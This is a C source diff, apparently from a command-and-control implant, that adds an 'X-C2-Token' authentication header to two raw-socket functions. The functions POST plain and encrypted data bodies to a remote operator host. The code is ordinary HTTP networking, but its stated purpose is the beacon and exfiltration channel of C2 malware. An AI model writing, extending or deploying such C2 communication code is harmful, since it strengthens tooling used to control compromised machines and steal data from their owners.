@@ -401,14 +401,27 @@ static int http_post_raw(const char *host, int port, const char *path,
     inet_pton(AF_INET, host, &addr.sin_addr);
     if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;
 
-    snprintf(hdr, sizeof(hdr),
-        "POST %s HTTP/1.1\r\n"
-        "Host: %s:%d\r\n"
-        "User-Agent: %s\r\n"
-        "Content-Type: application/octet-stream\r\n"
-        "Content-Length: %d\r\n"
-        "Connection: close\r\n\r\n",
-        path, host, port, USER_AGENT, body_len);
+    const char *auth_token = C2_AUTH_TOKEN;
+    if (auth_token[0] != '\0') {
+        snprintf(hdr, sizeof(hdr),
+            "POST %s HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "User-Agent: %s\r\n"
+            "X-C2-Token: %s\r\n"
+            "Content-Type: application/octet-stream\r\n"
+            "Content-Length: %d\r\n"
+            "Connection: close\r\n\r\n",
+            path, host, port, USER_AGENT, auth_token, body_len);
+    } else {
+        snprintf(hdr, sizeof(hdr),
+            "POST %s HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "User-Agent: %s\r\n"
+            "Content-Type: application/octet-stream\r\n"
+            "Content-Length: %d\r\n"
+            "Connection: close\r\n\r\n",
+            path, host, port, USER_AGENT, body_len);
+    }
 
     if (send(sockfd, hdr,           (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
     if (send(sockfd, (const char *)body, body_len,    0) == SOCKET_ERROR) goto cleanup;
@@ -472,14 +485,27 @@ static int http_post_encrypted(const char *host, int port, const char *path,
     inet_pton(AF_INET, host, &addr.sin_addr);
     if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;
 
-    snprintf(hdr, sizeof(hdr),
-        "POST %s HTTP/1.1\r\n"
-        "Host: %s:%d\r\n"
-        "User-Agent: %s\r\n"
-        "Content-Type: application/octet-stream\r\n"
-        "Content-Length: %zu\r\n"
-        "Connection: close\r\n\r\n",
-        path, host, port, USER_AGENT, enc_len);
+    const char *auth_token = C2_AUTH_TOKEN;
+    if (auth_token[0] != '\0') {
+        snprintf(hdr, sizeof(hdr),
+            "POST %s HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "User-Agent: %s\r\n"
+            "X-C2-Token: %s\r\n"
+            "Content-Type: application/octet-stream\r\n"
+            "Content-Length: %zu\r\n"
+            "Connection: close\r\n\r\n",
+            path, host, port, USER_AGENT, auth_token, enc_len);
+    } else {
+        snprintf(hdr, sizeof(hdr),
+            "POST %s HTTP/1.1\r\n"
+            "Host: %s:%d\r\n"
+            "User-Agent: %s\r\n"
+            "Content-Type: application/octet-stream\r\n"
+            "Content-Length: %zu\r\n"
+            "Connection: close\r\n\r\n",
+            path, host, port, USER_AGENT, enc_len);
+    }
 
     if (send(sockfd, hdr,                (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
     if (send(sockfd, (const char *)enc_body, (int)enc_len,    0) == SOCKET_ERROR) goto cleanup;
